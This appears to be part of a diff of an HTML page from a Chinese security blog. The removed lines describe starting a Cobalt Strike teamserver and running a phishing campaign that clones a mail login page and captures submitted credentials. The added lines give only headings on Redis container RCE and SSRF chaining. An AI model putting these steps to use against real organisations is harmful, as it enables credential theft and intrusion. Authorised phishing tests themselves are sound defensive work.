class="line">├── CobaltStrikeCN.jar     //[翻译插件]</span><br><span class="line">├── cobaltstrike.jar       //[主体程序]</span><br><span class="line">├── cobaltstrike.store</span><br><span class="line">├── data</span><br><span class="line">├── logs</span><br><span class="line">├── nohup.out              //[后台启动日志记录]-个人创建</span><br><span class="line">├── peclone</span><br><span class="line">├── peclone.bat</span><br><span class="line">├── start.sh               //[服务端后台启动脚本] -个人创建</span><br><span class="line">├── teamserver             //[Linux服务端启动程序]</span><br><span class="line">├── teamserver.bat</span><br><span class="line">└── third-party            //[vnc远程功能的dll等第三方工具]</span><br></pre></td></tr></table></figure>
-
-<p><strong>启动运行</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Cobalt Strike 团队服务器建议在VPS Linux 系统上运行，可持久运行，连接便捷</span><br><span class="line"></span><br><span class="line">$ nohup sh start.sh &amp;  //后台启动，日志记录至nohup.out</span><br><span class="line"></span><br><span class="line">启动脚本start.sh：teamserver &lt;server_host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line"></span><br><span class="line">2. 客户端选用Windows：运行teamserver.bat启动，输入服务端启动时配置的server_host、password即可</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-钓鱼实战"><a href="#0x04-钓鱼实战" class="headerlink" title="0x04 钓鱼实战"></a>0x04 钓鱼实战</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据搭建的钓鱼平台、制定的钓鱼方案，选取个人及同事通用邮箱、内部邮箱进行测试；针对全体员工的钓鱼测试修改收件人邮箱账号即可，原理及方法类似；本测试选取邮箱账户密码更新钓鱼场景，其余场景过程类似</span><br></pre></td></tr></table></figure>
-<h3 id="1-创建邮件用户-x2F-组"><a href="#1-创建邮件用户-x2F-组" class="headerlink" title="1. 创建邮件用户&#x2F;组"></a>1. 创建邮件用户&#x2F;组</h3><p>可通过上传CVS文件，进行批量添加邮件账号，批量发送邮件</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/group.png"></p>
-<p>测试选取了两个外部邮件服务商邮件账号、一个内部邮件账号</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_phish_test.png"></p>
-<h3 id="2-钓鱼邮件模板"><a href="#2-钓鱼邮件模板" class="headerlink" title="2. 钓鱼邮件模板"></a>2. 钓鱼邮件模板</h3><p>需在钓鱼邮件模板中的html进行更改和添加，可统计哪些人点开了钓鱼邮件，哪些人打开了钓鱼页面</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_template.png"></p>
-<pre><code>为了后续记录邮件是否打开，可勾选上AddTrackingImage，它将会在发送的每份邮件源码上插入一个唯一特定的隐藏图片，当邮件被打开时，此隐藏图片则也会被请求，以此来检测该邮件是否被打开，AddFiles则是给邮件添加附件
-</code></pre>
-<h3 id="3-伪造钓鱼页面"><a href="#3-伪造钓鱼页面" class="headerlink" title="3. 伪造钓鱼页面"></a>3. 伪造钓鱼页面</h3><p>配置好钓鱼邮件后，可以通过LandingPages模块来新建钓鱼网站页面，支持手写 html文件，也可通过导入网站功能，针对目标网页进行克隆; 如以下抓取内部网页邮箱登录界面：</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/4_page.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 选上CaptureSubmitted Data和CapturePasswords，记录受害者输入的账号和密码，为安全性，暂不选取密码记录</span><br><span class="line"></span><br><span class="line">2. Redirect to 是受害者点击完提交按钮后，自动跳转的网站</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-发起钓鱼攻击"><a href="#4-发起钓鱼攻击" class="headerlink" title="4. 发起钓鱼攻击"></a>4. 发起钓鱼攻击</h3><p>配置Campaigns，填写Name、选择钓鱼邮件模板、选择钓鱼网站模板、填写钓鱼网站 URL、填写发件邮箱、选择受害者邮件组</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/5_campaign.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">钓鱼网站URL根据实际钓鱼邮件测试情况，填写对应的地址，点击Launch Campaign即可成功发起一次钓鱼邮件攻击测试</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-仪表板查看"><a href="#5-仪表板查看" class="headerlink" title="5. 仪表板查看"></a>5. 仪表板查看</h3><p>实际测试中，选取了三个邮件账号，一个未打开邮件、一个打开邮件并点击链接、一个打开邮件后点击链接并输入登录账号密码，最终结果如下，和测试结果相同：</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/6_dashboard.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过仪表盘可详细看到那些邮件账户打开了邮件、点击了指定链接、并输入了账户和密码信息；钓鱼链接对主机无危害、仅显示那些账号对其进行了访问</span><br></pre></td></tr></table></figure>
-<hr>
-<center>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...</center></center></center>
+<h3 id="2-容器利用"><a href="#2-容器利用" class="headerlink" title="2. 容器利用"></a>2. 容器利用</h3><p>再来看容器场景下，此类部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，当类似虚拟机上的crontab、ssh等失效时，再加上权限的严格控制，只靠写文件很难再getshel了，这种情况下，可利用如下手段：</p>
+<h4 id="a-主从复制RCE"><a href="#a-主从复制RCE" class="headerlink" title="a. 主从复制RCE"></a>a. 主从复制RCE</h4><h3 id="3-提权姿势"><a href="#3-提权姿势" class="headerlink" title="3. 提权姿势"></a>3. 提权姿势</h3><p>当Redis以非root用户启动，该如何利用呢</p>
+<h3 id="4-组合姿势"><a href="#4-组合姿势" class="headerlink" title="4. 组合姿势"></a>4. 组合姿势</h3><p>当Redis仅开放在内网，可利用其他已知的公网漏洞进行组合利用</p>
+<h4 id="SSRF-Redis"><a href="#SSRF-Redis" class="headerlink" title="SSRF + Redis"></a>SSRF + Redis</h4><h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2>
     </div>
 
     
@@ -456,21 +296,20 @@ Account Settings|账户、UI、报告等设置
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Initial-Access/" rel="tag" <i class="fa fa-tag"></i> Initial Access</a>
-              <a href="/tags/Phishing/" rel="tag" <i class="fa fa-tag"></i> Phishing</a>
+              <a href="/tags/Execution/" rel="tag" <i class="fa fa-tag"></i> Execution</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/11935/" rel="prev" title="Osquery Linux Tables">
-                  <i class="fa fa-chevron-left"></i> Osquery Linux Tables
+                <a href="/posts/20001/" rel="prev" title="钓鱼邮件姿势总结">
+                  <i class="fa fa-chevron-left"></i> 钓鱼邮件姿势总结
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/20996/" rel="next" title="网络威胁框架演进">
-                  网络威胁框架演进 <i class="fa fa-chevron-right"></i>
+                <a href="/posts/98821/" rel="next" title="Linux加固手册">
+                  Linux加固手册 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
